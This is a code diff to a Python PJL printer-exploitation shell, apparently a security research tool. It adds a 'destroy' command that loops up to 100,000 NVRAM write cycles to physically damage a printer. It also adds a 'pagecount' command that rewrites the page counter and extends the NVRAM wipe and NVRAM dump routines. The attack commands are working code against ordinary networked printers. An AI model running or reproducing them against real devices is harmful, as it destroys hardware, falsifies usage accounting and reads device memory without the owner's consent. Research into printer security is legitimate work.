@@ -55,7 +55,6 @@ class pjl(printer):
   def on_connect(self, mode):
     if mode == 'init': # only for the first connection attempt
       self.cmd('@PJL USTATUSOFF', False) # disable status messages
-      self.cmd('@PJL SET TIMEOUT=255', False) # increase I/O timeout
 
   # ------------------------[ status ]----------------------------------
   def do_status(self, arg):
@@ -96,7 +95,7 @@ class pjl(printer):
   # check if remote volume exists
   def vol_exists(self, vol=''):
     str_recv = self.cmd('@PJL INFO FILESYS')
-    vols = [line.lstrip()[0] for line in str_recv.splitlines()[1:]]
+    vols = [line.lstrip()[0] for line in str_recv.splitlines()[1:] if line]
     if vol: return vol[0] in vols # return availability
     else: # return list of existing volumes for fuzzing
       return [vol + ':' + c.SEP for vol in vols]
@@ -358,6 +357,27 @@ class pjl(printer):
            + '@PJL DEFAULT ' + arg            + c.EOL
            + '@PJL SET '     + arg            + c.EOL
            + '@PJL SET SERVICEMODE=EXIT', False)
+    self.onecmd('printenv ' + arg)
+
+  # ------------------------[ pagecount <number> ]----------------------
+  def do_pagecount(self, arg):
+    "Manipulate printer's page counter:  pagecount <number>"
+    if not arg:
+      self.onecmd("help pagecount")
+    else:
+      output().raw("Old page counter: ", '')
+      self.onecmd("info pagecount")
+      # set page counter for older HP LaserJets
+      # self.cmd('@PJL SET SERVICEMODE=HPBOISEID'     + c.EOL
+      #        + '@PJL DEFAULT OEM=ON'                + c.EOL
+      #        + '@PJL DEFAULT PAGES='          + arg + c.EOL
+      #        + '@PJL DEFAULT PRINTPAGECOUNT=' + arg + c.EOL
+      #        + '@PJL DEFAULT SCANPAGECOUNT='  + arg + c.EOL
+      #        + '@PJL DEFAULT COPYPAGECOUNT='  + arg + c.EOL
+      #        + '@PJL SET SERVICEMODE=EXIT', False)
+      self.onecmd("set PAGES=" + arg)
+      output().raw("New page counter: ", '')
+      self.onecmd("info pagecount")
 
   # ====================================================================
 
@@ -395,6 +415,7 @@ class pjl(printer):
       self.cmd('@PJL SET SERVICEMODE=HPBOISEID' + c.EOL
              + '@PJL CLEARNVRAM'                + c.EOL
              + '@PJL NVRAMINIT'                 + c.EOL
+             + '@PJL INITIALIZE'                + c.EOL
              + '@PJL SET SERVICEMODE=EXIT', False)
 
   # ------------------------[ selftest ]--------------------------------
@@ -444,6 +465,20 @@ class pjl(printer):
     output().chitchat("Printing functionality: " + str_disable)
     self.do_set('JOBMEDIA=' + str_disable)
 
+  # ------------------------[ destroy ]---------------------------------
+  def do_destroy(self, arg):
+    "Cause physical damage to printer's NVRAM."
+    output().warning("Warning: This command tries to cause physical damage to the")
+    output().warning("printer NVRAM. Use at your own risk. Press CTRL+C to abort.")
+    if output().countdown("Starting NVRAM write cycle loop in...", 10, self):
+      for n in range(1, 100000):
+        # self.cmd('@PJL DEFAULT COPIES=' + str(n%2+2), True)
+        # print n
+        # self.cmd('@PJL DEFAULT COPIES=' + str(n%999), True)
+        self.onecmd("set COPIES=" + str(n%999))
+        # if n % 100 == 0: output().countdown(str(n) + " write cycles, pausing for...", 3, self)
+        # self.onecmd("set PAGES=" + str(n)) # muss wieder auf False geändert werden!
+
   # ------------------------[ hold ]------------------------------------
   def do_hold(self, arg):
     "Enable job retention."
@@ -465,7 +500,7 @@ class pjl(printer):
       bs = 2**9    # memory block size used for sampling
       max = 2**18  # maximum memory address for sampling
       steps = 2**9 # number of bytes to dump at once (feedback-performance trade-off)
-      outfile = self.basename(self.target) + '.nvram' # local copy of printer's nvram
+      lpath = os.path.join('nvram', self.basename(self.target)) # local copy of nvram
       #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
       # ******* sampling: populate memspace with valid addresses ******
       if len(re.split("\s+", arg, 1)) > 1:
@@ -485,16 +520,16 @@ class pjl(printer):
       #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
       # ******* dumping: read nvram and write copy to local file ******
       commands = ['@PJL RNVRAM ADDRESS=' + str(n) for n in memspace]
-      self.chitchat("Writing copy to " + outfile)
-      file().write(outfile, '') # first write empty file
+      self.chitchat("Writing copy to " + lpath)
       for chunk in (list(chunks(commands, steps))):
         str_recv = self.cmd(c.EOL.join(chunk))
         # break on unsupported printers
-        if not str_recv: return os.remove(outfile)
+        if not str_recv: return
+        else: self.makedirs('nvram')
         for data in re.findall('DATA\s*=\s*(\d+)', str_recv):
           char = chr(int(data))
           # append char to file
-          file().append(outfile, char)
+          file().append(lpath, char)
           # print char to screen
           output().raw(char if int(data) in range(32, 127) else '.', "")
       print
